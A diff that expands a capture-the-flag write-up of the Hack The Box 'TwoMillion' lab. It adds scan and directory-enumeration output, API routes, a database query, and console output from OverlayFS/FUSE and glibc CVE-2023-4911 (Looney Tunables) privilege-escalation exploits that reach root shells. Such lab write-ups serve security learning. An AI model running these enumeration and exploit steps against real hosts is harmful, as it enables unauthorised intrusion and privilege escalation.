@@ -49,19 +49,37 @@ PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
-|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+|   ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
+|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+|_  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
 80/tcp open  http    syn-ack ttl 63 nginx
 |_http-title: Did not follow redirect to http://2million.htb/
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Key observations:
-- HTTP immediately redirects to `2million.htb` — add to `/etc/hosts` before proceeding
-- **`HttpOnly` flag not set** on `PHPSESSID` — session is theoretically hijackable via XSS
+HTTP redirects to `2million.htb` — add to `/etc/hosts` before proceeding:
 
 ```bash
 echo '10.129.229.66  2million.htb' | sudo tee -a /etc/hosts
 ```
+
+Re-running nmap against the hostname reveals the `PHPSESSID` cookie is issued without the `HttpOnly` flag:
+
+```
+# Console Output (scan against 2million.htb)
+80/tcp open  http    syn-ack ttl 63 nginx
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Hack The Box :: Penetration Testing Labs
+| http-methods:
+|_  Supported Methods: GET
+```
+
+**`HttpOnly` flag not set** on `PHPSESSID` — session is theoretically hijackable via XSS.
 
 ### Dirsearch
 
@@ -71,14 +89,23 @@ dirsearch -u http://2million.htb
 
 ```
 # Console Output
-[15:26:44] 301 -  162B  - /js       -> http://2million.htb/js/
+[15:26:44] 301 -  162B  - /js       ->  http://2million.htb/js/
+[15:26:50] 200 -    2KB - /404
 [15:27:01] 401 -    0B  - /api
 [15:27:01] 401 -    0B  - /api/v1
 [15:27:02] 403 -  548B  - /assets/
+[15:27:02] 301 -  162B  - /assets   ->  http://2million.htb/assets/
 [15:27:08] 403 -  548B  - /controllers/
+[15:27:08] 301 -  162B  - /css      ->  http://2million.htb/css/
+[15:27:12] 301 -  162B  - /fonts    ->  http://2million.htb/fonts/
+[15:27:14] 302 -    0B  - /home     ->  /
+[15:27:15] 403 -  548B  - /images/
+[15:27:15] 301 -  162B  - /images   ->  http://2million.htb/images/
+[15:27:18] 403 -  548B  - /js/
 [15:27:20] 200 -    4KB - /login
-[15:27:20] 302 -    0B  - /logout   -> /
+[15:27:20] 302 -    0B  - /logout   ->  /
 [15:27:31] 200 -    4KB - /register
+[15:27:43] 301 -  162B  - /views    ->  http://2million.htb/views/
 ```
 
 `/api` and `/api/v1` return `401` — they exist but require authentication. VHost fuzzing returns nothing. The web root loads a themed recreation of the HackTheBox v1 platform; registration requires an invite code. Opening DevTools (F12) and monitoring the **Network** tab during page load reveals a GET request to `/js/inviteapi.min.js`.
@@ -175,8 +202,13 @@ curl -s http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=04is49j22jq7bi3tqk8a4i4
     "user": {
       "GET": {
         "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
         "/api/v1/user/auth": "Check if user is authenticated",
-        "/api/v1/user/vpn/generate": "Generate a new VPN configuration"
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
       },
       "POST": {
         "/api/v1/user/register": "Register a new user",
@@ -326,8 +358,11 @@ ss -tl
 
 ```
 # Console Output
-LISTEN  127.0.0.1:mysql     0.0.0.0:*
+LISTEN  127.0.0.1:mysql      0.0.0.0:*
+LISTEN  127.0.0.1:11211      0.0.0.0:*
 ```
+
+MySQL and memcached are both listening locally. Connecting to MariaDB with the `.env` credentials:
 
 ```bash
 mysql -u admin -p'<PASSWORD REDACTED>' htb_prod -e "select username, password, is_admin from users;"
@@ -361,10 +396,16 @@ cat /var/mail/admin
 ```
 # Console Output
 From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
 Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
 
-...There have been a few serious Linux kernel CVEs already this year.
-That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
 ```
 
 ```bash
@@ -401,9 +442,23 @@ The exploit requires two concurrent terminal sessions. Terminal 1:
 ```
 # Console Output
 [+] len of gc: 0x3ef0
+mkdir: File exists
 [+] readdir
 [+] getattr_callback
 /file
+[+] open_callback
+/file
+[+] read buf callback
+offset 0
+size 16384
+path /file
+[+] open_callback
+/file
+[+] open_callback
+/file
+[+] ioctl callback
+path /file
+cmd 0x80086601
 ```
 
 Terminal 2, immediately after:
@@ -416,9 +471,13 @@ Terminal 2, immediately after:
 # Console Output
 uid:33 gid:33
 [+] mount success
+total 8
+drwxr-xr-x 1 root   root     4096 Jun 14 18:45 .
+drwxr-xr-x 6 root   root     4096 Jun 14 18:45 ..
 -rwsrwxrwx 1 nobody nogroup 16112 Jan  1  1970 file
 [+] exploit success!
-root@2million:/tmp#
+root@2million:/tmp# whoami
+root
 ```
 
 ```bash
@@ -434,7 +493,18 @@ cat /root/root.txt
 
 ![CVE-2023-4911 — Looney Tunables](../.gitbook/assets/twomillion_looney_tunables.png)
 
-**CVE-2023-4911** is a buffer overflow in glibc's `ld.so` dynamic loader triggered via a malformed `GLIBC_TUNABLES` environment variable. Affected: glibc \< 2.38 on Fedora 37/38, Ubuntu 22.04/23.04, Debian 12/13. Verify exploitability:
+**CVE-2023-4911** is a buffer overflow in glibc's `ld.so` dynamic loader triggered via a malformed `GLIBC_TUNABLES` environment variable. Affected: glibc \< 2.38 on Fedora 37/38, Ubuntu 22.04/23.04, Debian 12/13. Verify the installed glibc version:
+
+```bash
+ldd --version
+```
+
+```
+# Console Output
+ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
+```
+
+Confirm exploitability:
 
 ```bash
 env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" \
@@ -457,7 +527,12 @@ python3 gnu-acme.py
       $$$ glibc ld.so (CVE-2023-4911) exploit $$$
             -- by blasty <peter@haxx.in> --
 
+[i] libc = /lib/x86_64-linux-gnu/libc.so.6
+[i] suid target = /usr/bin/su, suid_args = ['--help']
+[i] ld.so = /lib64/ld-linux-x86-64.so.2
 [i] ld.so build id = 61ef896a699bb1c2e4e231642b2e1688b2f1a61e
+[i] __libc_start_main = 0x29dc0
+[i] using hax path b'"' at offset -20
 [i] wrote patched libc.so.6
 [i] using stack addr 0x7ffe1010100c
 .................# ** ohh... looks like we got a shell? **
